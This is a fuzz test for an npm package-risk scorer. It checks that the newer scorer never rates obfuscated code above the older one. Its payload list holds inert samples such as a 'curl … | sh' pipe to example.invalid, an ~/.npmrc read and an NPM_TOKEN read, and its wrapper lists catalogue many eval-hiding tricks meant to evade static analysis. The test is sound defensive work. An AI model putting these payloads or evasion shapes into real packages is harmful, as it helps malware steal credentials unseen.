// The floor, tested as a property: whatever the code is wrapped in, apm-score-v7 never scores a package above
// apm-score-v3 (test/v3, copied from git history), the last scorer that read every file as raw text. Each case nests
// two or three wrapper shapes taken from the four independent reviews (template tags, Function subclasses and
// constructor chains, generators, Symbol keys, bind/apply/call/Reflect, Proxies, getters, namespaces, logical,
// ternary and comma callees, shadowing decoys, `with`, exports wildcards, comments ended by every line terminator,
// HTML comments, JSX text, padding past the parse limit, token-window boundaries) around an inert payload, and scores
// the same package with both. Nothing is run: the payloads only name example.invalid, child_process and a token.
//
//   bun test packages/core/test/floor-fuzz.test.ts                                   fixed seed, CI size
//   APM_FUZZ_CASES=10000 APM_FUZZ_SEED=random bun test packages/core/test/floor-fuzz.test.ts   long run
//
// A failure prints the seed, the case number and the shapes, so `APM_FUZZ_SEED=<seed>` replays it.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
import lexerData from "./fixtures/sol-lexer.json";
import v5Data from "./fixtures/sol-parser-v5.json";
import v6Data from "./fixtures/sol-parser-v6.json";
import { analyze as analyzeV3, finalize as finalizeV3 } from "./v3/score.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

const CI_SEED = 20_261_112;
const CI_CASES = 300;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

/** The package.json fields a generated package sets. */
type Manifest = { name: string; version: string; license: string; main: string; exports?: Record<string, string | Record<string, Record<string, string>>> };

/** One package: its files, with `package.json` written from `manifest`. */
type Pkg = { manifest: Manifest; files: Record<string, string> };

function tarOf(p: Pkg): TarEntry[] {
  return [entry("package.json", JSON.stringify(p.manifest)), ...Object.entries(p.files).map(([path, text]) => entry(path, text))];
}

function scoreV7(p: Pkg): ScoreReport {
  return finalize(analyze({ name: "probe-pkg", manifest: p.manifest, files: tarOf(p), publisher: "a", previousPublishers: [] }), STATE);
}

function scoreV3(p: Pkg): number {
  return finalizeV3(analyzeV3({ name: "probe-pkg", manifest: p.manifest, files: tarOf(p), publisher: "a", previousPublishers: [] }), STATE).score;
}

function single(file: string, src: string): Pkg {
  return { manifest: { name: "probe-pkg", version: "1.0.0", license: "MIT", main: file }, files: { [file]: src } };
}

// ---------- a seeded generator ----------

/** mulberry32: small, fast and the same on every machine. */
function rng(seed: number): () => number {
  let a = seed >>> 0;

  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);

    return ((t ^ (t >>> 14)) >>> 0) / 4_294_967_296;
  };
}

type Rand = () => number;

function pick<T>(r: Rand, list: readonly T[]): T {
  const v = list[Math.floor(r() * list.length)];

  if (v === undefined) throw new Error("empty list");

  return v;
}

// ---------- the payloads: inert, and each something apm-score-v3 refuses or marks ----------

/** The v6 review's evaluator payload: a builtin load built from pieces, a request, a token read and an eval. */
const FULL = "process.getBuiltinModule('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1')";

const PAYLOADS: readonly string[] = [
  FULL,
  "require('child_process')",
  "fetch('https://example.invalid')",
  "process.env.NPM_TOKEN",
  "eval('1')",
  "require('fs').readFileSync(require('os').homedir() + '/.npmrc')",
  "require('child_process').execSync('curl -s https://example.invalid | sh')",
  "new Function('return 1')()",
  "import('https://example.invalid/x.mjs')",
];

// ---------- the shapes ----------

/** Where a shape is valid: plain scripts may use sloppy-mode syntax (`with`, assigning a global); TypeScript has namespaces. */
type Lang = "script" | "module" | "ts";

/** A string literal holding `code`. */
function q(code: string): string {
  return JSON.stringify(code);
}

/** Template text holding `code`. */
function t(code: string): string {
  return code.replace(/\\/g, "\\\\").replace(/`/g, "\\`").replace(/\$\{/g, "\\${");
}

/**
 * A shape that runs `code` (JavaScript source): it returns code that hands the string to an evaluator some way. Only
 * shapes that run what they wrap belong here; one that does not (eval as a tag, a string only compared) is a precision
 * case, where scoring above v3 is right, and sits with the review fixtures instead.
 */
type CodeWrapper = { name: string; langs?: readonly Lang[]; wrap: (code: string) => string };

const ALL: readonly Lang[] = ["script", "module", "ts"];
const SLOPPY: readonly Lang[] = ["script"];
const NOT_TS: readonly Lang[] = ["script", "module"];

const CODE_WRAPPERS: readonly CodeWrapper[] = [
  { name: "eval", wrap: (c) => `eval(${q(c)});` },
  { name: "Function", wrap: (c) => `Function(${q(c)})();` },
  { name: "new-Function", wrap: (c) => `new Function(${q(c)})();` },
  { name: "Function-tag", wrap: (c) => `Function\`${t(c)}\`();` },
  { name: "extends-Function", wrap: (c) => `class F extends Function {};new F(${q(c)})();` },
  { name: "super-Function", wrap: (c) => `class F extends Function {constructor(){super(${q(c)})}};new F()();` },
  { name: "prototype-constructor", wrap: (c) => `Function.prototype.constructor(${q(c)})();` },
  { name: "constructor-chain", wrap: (c) => `(()=>{}).constructor.prototype.constructor(${q(c)})();` },
  { name: "async-constructor", wrap: (c) => `(async()=>{}).constructor(${q(c)})();` },
  { name: "array-constructor-chain", wrap: (c) => `[].map.constructor(${q(c)})();` },
  { name: "computed-bind", wrap: (c) => `eval['bind'](null,${q(c)})();` },
  { name: "bind", wrap: (c) => `eval.bind(null,${q(c)})();` },
  { name: "call", wrap: (c) => `eval.call(null,${q(c)});` },
  { name: "apply", wrap: (c) => `eval.apply(null,[${q(c)}]);` },
  { name: "Reflect.apply", wrap: (c) => `Reflect.apply(eval,null,[${q(c)}]);` },
  { name: "Reflect.construct", wrap: (c) => `Reflect.construct(Function,[${q(c)}])();` },
  { name: "comma", wrap: (c) => `(0,eval)(${q(c)});` },
  { name: "logical-or", wrap: (c) => `(null||eval)(${q(c)});` },
  { name: "logical-nullish", wrap: (c) => `(undefined??eval)(${q(c)});` },
  { name: "ternary", wrap: (c) => `(Math.random()>2?String:eval)(${q(c)});` },
  { name: "getter", wrap: (c) => `const o={get go(){return eval}};o.go(${q(c)});` },
  { name: "getter-this", wrap: (c) => `const o={x:eval,get go(){return this.x}};o.go(${q(c)});` },
  { name: "proxy-target", wrap: (c) => `const o=new Proxy({go:eval},{});o.go(${q(c)});` },
  { name: "proxy-trap", wrap: (c) => `const o=new Proxy({},{get:()=>eval});o.go(${q(c)});` },
  { name: "symbol-key", wrap: (c) => `const k=Symbol('k');const o={[k]:eval};o[k](${q(c)});` },
  { name: "symbol-for", wrap: (c) => `const o={[Symbol.for('go')]:eval};o[Symbol.for('go')](${q(c)});` },
  { name: "generator-yield", wrap: (c) => `function* g(){yield eval}g().next().value(${q(c)});` },
  { name: "generator-return", wrap: (c) => `function* g(){return eval}g().next().value(${q(c)});` },
  { name: "async-await", wrap: (c) => `(async()=>{async function g(){return eval}(await g())(${q(c)})})();` },
  { name: "alias-write", wrap: (c) => `const o={};const a=o;a.go=eval;o.go(${q(c)});` },
  { name: "descriptor", wrap: (c) => `const d={get:()=>eval};const o={};Object.defineProperty(o,'go',d);o.go(${q(c)});` },
  { name: "return-limit", wrap: (c) => `function g(x){if(x===0)return eval;if(x===1)return 1;if(x===2)return 2;if(x===3)return 3;if(x===4)return 4;return 5}g(0)(${q(c)});` },
  { name: "candidate-limit", wrap: (c) => `const a=()=>1,b=()=>2,c=()=>3,d=()=>4,e=()=>5,f=()=>6,h=()=>7;const v=[0,0,0,0,0,0,0];(v[0]?a:v[1]?b:v[2]?c:v[3]?d:v[4]?e:v[5]?f:v[6]?h:eval)(${q(c)});` },
  { name: "returned-string", wrap: (c) => `function g(){return ${q(c)}}eval(g());` },
  { name: "const-string", wrap: (c) => `const s=${q(c)};eval(s);` },
  { name: "compared-then-run", wrap: (c) => `const s=${q(c)};if(s==="x"){}eval(s);` },
  { name: "array-join", wrap: (c) => `eval([${q(c)}].join(''));` },
  { name: "String.raw", wrap: (c) => `eval(String.raw\`${t(c)}\`);` },
  { name: "error-message", wrap: (c) => `try{throw new Error(${q(c)})}catch(e){eval(e.message)}` },
  { name: "path-join", wrap: (c) => `eval(require('path').basename(${q(c)}));` },
  { name: "object-arg", wrap: (c) => `function run(o){eval(o.code)}run({code:${q(c)}});` },
  { name: "spread-args", wrap: (c) => `eval(...[${q(c)}]);` },
  { name: "arguments", wrap: (c) => `(function(){eval(arguments[0])})(${q(c)});` },
  { name: "parameter-function", wrap: (c) => `function go(f,s){f(s)()}go(Function,${q(c)});` },
  { name: "json-parse", wrap: (c) => `eval(JSON.parse(${q(q(c))}));` },
  { name: "timer", wrap: (c) => `setTimeout(${q(c)});` },
  { name: "vm", wrap: (c) => `require('vm').runInThisContext(${q(c)});` },
  { name: "global-member", wrap: (c) => `globalThis['ev'+'al'](${q(c)});` },
  { name: "global-alias", wrap: (c) => `const g=globalThis;g.eval(${q(c)});` },
  { name: "this-global", langs: SLOPPY, wrap: (c) => `const g=this;g.eval(${q(c)});` },
  // a sink the proofs trust, replaced first: what it is handed must still count
  { name: "fetch-replaced", wrap: (c) => `globalThis.fetch=eval;fetch(${q(c)});` },
  { name: "fetch-assigned", langs: SLOPPY, wrap: (c) => `fetch=eval;fetch(${q(c)});` },
  { name: "fetch-assign", wrap: (c) => `Object.assign(globalThis,{fetch:eval});fetch(${q(c)});` },
  { name: "fetch-define", wrap: (c) => `Object.defineProperty(globalThis,'fetch',{value:eval});fetch(${q(c)});` },
  { name: "fetch-helper", wrap: (c) => `function set(o,k,v){o[k]=v}set(globalThis,'fe'+'tch',eval);fetch(${q(c)});` },
  { name: "fetch-sloppy-this", langs: SLOPPY, wrap: (c) => `(function(){return this})().fetch=eval;fetch(${q(c)});` },
  { name: "fetch-with", langs: SLOPPY, wrap: (c) => `with({fetch:eval}){fetch(${q(c)})}` },
  { name: "fetch-block-function", langs: SLOPPY, wrap: (c) => `if(1){function fetch(s){eval(s)}}fetch(${q(c)});` },
  { name: "error-prototype", wrap: (c) => `Error.prototype.toString=function(){return eval(this.message)};fetch(new Error(${q(c)}));` },
  { name: "object-prototype-getter", wrap: (c) => `Object.defineProperty(Object.prototype,'method',{get(){eval(this.body);return'GET'}});fetch('https://example.invalid',{body:${q(c)}});` },
  { name: "path-replaced", wrap: (c) => `const p=require('path');p.join=eval;p.join(${q(c)});` },
  { name: "dead-looking-read-by-eval", wrap: (c) => `function f(){const s=${q(c)};eval('eval(s)')}f();` },
  { name: "with-read", langs: SLOPPY, wrap: (c) => `function f(){const s=${q(c)};with({}){eval(s)}}f();` },
  // places a proof might take for harmless, from which the code is read back and run
  { name: "key-listed", wrap: (c) => `const o={${q(c)}:1};eval(Object.keys(o)[0]);` },
  { name: "completion-value", wrap: (c) => `eval(eval(${q(`${q(c)};`)}));` },
  { name: "string-builders", wrap: (c) => `eval(decodeURIComponent(encodeURIComponent(String(${q(c)}))));` },
  { name: "json-roundtrip", wrap: (c) => `eval(JSON.parse(JSON.stringify(${q(c)})));` },
  { name: "template-interpolation", wrap: (c) => `eval(\`\${${q(c)}}\`);` },
  { name: "sink-alias", wrap: (c) => `const fetch=eval;fetch(${q(c)});` },
  { name: "sink-call", wrap: (c) => `globalThis.fetch=eval;fetch.call(null,${q(c)});` },
  { name: "sink-spread", wrap: (c) => `globalThis.fetch=eval;fetch(...[${q(c)}]);` },
  { name: "error-thrown", wrap: (c) => `function f(){throw new Error(${q(c)})}try{f()}catch(e){Function(e.message)()}` },
  { name: "path-roundtrip", wrap: (c) => `eval(require('path').normalize(${q(c)}));` },
  { name: "ignored-slot-moved", wrap: (c) => `const e=(a,b)=>eval(b);e(1,${q(c)});` },
  { name: "conditional-value", wrap: (c) => `eval(Math.random()>2?'1':${q(c)});` },
  { name: "logical-value", wrap: (c) => `eval(''||${q(c)});` },
  { name: "dead-at-top-read-later", wrap: (c) => `var s=${q(c)};setTimeout(()=>eval(s));` },
  { name: "namespace-merge", langs: ["ts"], wrap: (c) => `namespace X{export const go=eval}namespace X{go(${q(c)})}` },
  { name: "namespace-fetch", langs: ["ts"], wrap: (c) => `namespace X{export const fetch=eval}namespace X{fetch(${q(c)})}` },
];

/** A shape around a whole program: where it sits in the file, and what sits around it. */
type Surrounding = { name: string; langs?: readonly Lang[]; wrap: (code: string, lang: Lang) => string };

const SURROUNDINGS: readonly Surrounding[] = [
  { name: "none", wrap: (c) => c },
  { name: "iife", wrap: (c) => `(function(){${c}})();` },
  { name: "arrow-iife", wrap: (c) => `(()=>{${c}})();` },
  { name: "block", wrap: (c) => `{${c}}` },
  // decoys bind the dangerous names in another scope; they hold nothing apm-score-v3 would count themselves
  { name: "unused-function-decoy", wrap: (c) => `function unused(){const fetch=()=>{};const require=()=>{};}${c}` },
  { name: "local-function-decoy", wrap: (c) => `function f(){var fetch=()=>1;var exec=()=>2;return [fetch,exec]}f();${c}` },
  { name: "line-comment-lf", wrap: (c) => `// note\n${c}` },
  { name: "line-comment-cr", wrap: (c) => `// note\r${c}` },
  { name: "line-comment-ls", wrap: (c) => `// note ${c}` },
  { name: "line-comment-ps", wrap: (c) => `// note ${c}` },
  { name: "block-comment", wrap: (c) => `/* note */${c}` },
  { name: "html-open-comment", langs: SLOPPY, wrap: (c) => `x<!-- note\n${c}` },
  { name: "html-close-comment", langs: SLOPPY, wrap: (c) => `0\n--> note\n${c}` },
  { name: "hashbang", wrap: (c) => `#!/usr/bin/env node\n${c}` },
  { name: "regex-before", wrap: (c) => `const r=/[/*]/g;r.test('x');${c}` },
  { name: "with-block", langs: SLOPPY, wrap: (c) => `with({}){${c}}` },
  { name: "strict", wrap: (c) => `"use strict";${c}` },
  { name: "class-method", wrap: (c) => `class A{run(){${c}}}new A().run();` },
  { name: "jsx-text", langs: NOT_TS, wrap: (c) => `const el=<div>// note {(()=>{${c}})()}</div>;` },
  { name: "namespace", langs: ["ts"], wrap: (c) => `namespace N{${c}}` },
  { name: "export", langs: ["module", "ts"], wrap: (c) => `export const x=1;${c}` },
];

/** Shapes that change the package rather than the text: where the file lives, or how large it is. */
type Layout = "main" | "padded" | "wildcard-export" | "window";

// ---------- one case ----------

type Case = { names: string[]; pkg: Pkg };

const FILES: Record<Lang, string> = { script: "index.js", module: "index.mjs", ts: "index.ts" };

/** The token pass's window (source.ts); a file has no tree past it, so a call is placed across its first boundary. */
const WINDOW = 4 * 1024 * 1024;

function makeCase(r: Rand): Case {
  const lang = pick(r, ["script", "script", "module", "ts"] as const);
  const fits = <S extends { langs?: readonly Lang[] }>(s: S): boolean => (s.langs ?? ALL).includes(lang);
  const names: string[] = [lang];
  let code = pick(r, PAYLOADS);

  names.push(`payload:${PAYLOADS.indexOf(code)}`);
  // two or three shapes in all: one or two around the code, then one around the program
  const depth = r() < 0.5 ? 1 : 2;

  for (let i = 0; i < depth; i++) {
    const s = pick(r, CODE_WRAPPERS.filter(fits));
    code = s.wrap(code);
    names.push(s.name);
  }

  const ctx = pick(r, SURROUNDINGS.filter(fits));
  const jsx = ctx.name === "jsx-text";
  let src = ctx.wrap(code, lang);

  names.push(ctx.name);
  const roll = r();
  const layout: Layout = roll < 0.06 ? "padded" : roll < 0.1 ? "wildcard-export" : roll < 0.11 && lang === "ts" ? "window" : "main";
  let file = jsx ? "index.jsx" : FILES[lang];

  names.push(layout);

  if (layout === "padded") src = lang === "ts" ? `/*${"x".repeat(1024 * 1024)}*/\n${src}` : `${"0;".repeat(240_001)}${src}`;

  if (layout === "window") {
    // an escaped name before the boundary and its call after it, with a comment between longer than any fixed overlap
    src = `/*${"x".repeat(WINDOW - 104)}*/\nf\\u0065tch/*${"x".repeat(70_000)}*/('https://example.invalid');\n${src}`;
    file = "index.ts";
  }

  if (layout === "wildcard-export") {
    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js", exports: { ".": "./index.js", "./*": { node: { require: "./docs/*.txt" } } } };

    return { names, pkg: { manifest, files: { "index.js": "module.exports = 1;\n", "docs/payload.txt": src } } };
  }

  return { names, pkg: single(file, src) };
}

function describeCase(seed: number, i: number, c: Case, v3: number, v7: ScoreReport): string {
  const signals = v7.signals.map((s) => `${s.id}:${s.confidence}`).join(", ");

  const src = Object.entries(c.pkg.files)
    .map(([p, text]) => `${p}: ${text.length > 600 ? `${text.slice(0, 120)} … ${text.slice(-400)}` : text}`)
    .join("\n");

  return `seed ${seed}, case ${i}: ${c.names.join(" > ")}\nv3 ${v3}, v7 ${v7.score} (${signals})\n${src}`;
}

// ---------- the tests ----------

describe("the v3 reference is apm-score-v3", () => {
  // every stored v3 score of the three reviews' fixtures, single-file ones, is what test/v3 computes
  const stored = [...lexerData, ...v5Data, ...v6Data].filter((f) => !("extra" in f) && !("manifest" in f) && !("pad" in f));

  test(`it reproduces the reviews' ${stored.length} stored v3 scores`, () => {
    for (const f of stored) expect(scoreV3(single(f.file, f.src)), f.name).toBe(f.v3);
  });
});

describe("the floor: no shape lifts a package above apm-score-v3", () => {
  const cases = Number(process.env.APM_FUZZ_CASES ?? CI_CASES);
  const seedEnv = process.env.APM_FUZZ_SEED;
  const seed = seedEnv === "random" ? Math.floor(Math.random() * 2 ** 31) : Number(seedEnv ?? CI_SEED);

  test(
    `${cases} generated packages, seed ${seed}`,
    () => {
      const r = rng(seed);
      const failures: string[] = [];
      let refused = 0;

      for (let i = 0; i < cases; i++) {
        const c = makeCase(r);
        const v3 = scoreV3(c.pkg);
        const v7 = scoreV7(c.pkg);

        if (v3 < SCORE_FLOOR) refused++;

        if (v7.score > v3) failures.push(describeCase(seed, i, c, v3, v7));

        if (failures.length >= 5) break;
      }

      if (process.env.APM_FUZZ_CASES) console.log(`floor fuzz: seed ${seed}, ${cases} cases, ${refused} refused by v3, ${failures.length} above v3`);

      expect(failures, failures.join("\n\n")).toEqual([]);
    },
    Number(process.env.APM_FUZZ_TIMEOUT ?? 120_000),
  );

  test("every payload, layout and context appears in the CI seed's cases", () => {
    const r = rng(CI_SEED);
    const seen = new Set<string>();

    for (let i = 0; i < CI_CASES; i++) for (const n of makeCase(r).names) seen.add(n);

    const missing = [...SURROUNDINGS.map((s) => s.name), ...PAYLOADS.map((_, i) => `payload:${i}`), "padded", "wildcard-export"].filter((n) => !seen.has(n));

    expect(missing).toEqual([]);
  });

  // every code shape alone, in every language it is valid in, around the review's payload: the composed cases may
  // draw a shape rarely, so each is also scored on its own
  for (const s of CODE_WRAPPERS) {
    test(`alone: ${s.name}`, () => {
      for (const lang of s.langs ?? ALL) {
        const pkg = single(FILES[lang], s.wrap(FULL));
        const v3 = scoreV3(pkg);
        const v7 = scoreV7(pkg);

        expect(v7.score, `${lang}: v3 ${v3}`).toBeLessThanOrEqual(v3);
      }
    });
  }
});
